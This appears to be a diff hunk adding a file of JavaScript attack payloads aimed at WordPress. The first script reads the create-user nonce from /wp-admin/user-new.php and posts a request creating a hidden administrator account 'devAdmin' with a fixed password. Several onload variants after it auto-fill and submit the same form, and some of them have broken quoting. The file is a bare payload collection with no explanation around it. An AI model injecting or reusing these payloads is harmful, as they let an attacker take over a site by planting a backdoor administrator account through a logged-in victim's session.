@@ -1,0 +1,21 @@
+<script>(async()=>{try{const U='devAdmin',P='Admin!2025',E='devAdmin@example.test';const r=await fetch('/wp-admin/user-new.php',{credentials:'same-origin'});const t=await r.text();const n=(t.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/)||[])[1];if(!n){console.log('nonce not found');return}const d=new URLSearchParams();d.append('_wpnonce_create-user',n);d.append('_wp_http_referer','/wp-admin/user-new.php');d.append('action','createuser');d.append('user_login',U);d.append('email',E);d.append('pass1',P);d.append('pass2',P);d.append('role','administrator');await fetch('/wp-admin/user-new.php',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:d.toString()});console.log('Created admin:',U,'/',P);}catch(e){console.error(e)}})();</script>
+
+
+onload='()=>{const f=document.querySelector('form[action$="user-new.php"]');if(f){f.user_login.value="devAdmin";f.email.value="devAdmin@example.test";f.pass1.value=f.pass2.value="Admin!2025";f.role.value="administrator";f.submit();}};
+
+
+onload'=()=>{with(document.querySelector('form[action$="user-new.php"]')){user_login.value="devAdmin";email.value="devAdmin@example.test";pass1.value=pass2.value="Admin!2025";role.value="administrator";submit()}};
+
+
+
+onload='()=>{const f=document.querySelector('form#createuser, form[action$="user-new.php"]');if(!f)return console.log("WP create-user form not found");const s=(n,v)=>{let e=f.querySelector(`[name="${n}"]`);if(!e){e=document.createElement("input");e.type="hidden";e.name=n;f.appendChild(e)}e.value=v};s("user_login","devAdmin");s("email","devAdmin@example.test");s("pass1","Admin!2025");s("pass2","Admin!2025");const r=f.querySelector('select[name="role"]');if(r)r.value="administrator";s("action","createuser");f.submit()};
+
+
+<script>window.onload=()=>{const f=document.querySelector('form#createuser, form[action$="user-new.php"]');if(!f)return console.log("WP create-user form not found");const s=(n,v)=>{let e=f.querySelector(`[name="${n}"]`);if(!e){e=document.createElement("input");e.type="hidden";e.name=n;f.appendChild(e)}e.value=v};s("user_login","devAdmin");s("email","devAdmin@example.test");s("pass1","Admin!2025");s("pass2","Admin!2025");const r=f.querySelector('select[name="role"]');if(r)r.value="administrator";s("action","createuser");f.submit()};</script>
+
+onload=()=>{with(document.querySelector('form[action$="user-new.php"]')){user_login.value="devAdmin";email.value="devAdmin@example.test";pass1.value=pass2.value="Admin!2025";role.value="administrator";submit()}};
+
+window.onload=()=>{with(document.querySelector('form[action$="user-new.php"]')){user_login.value="devAdmin";email.value="devAdmin@example.test";pass1.value=pass2.value="Admin!2025";role.value="author";submit()}};
+
+
+
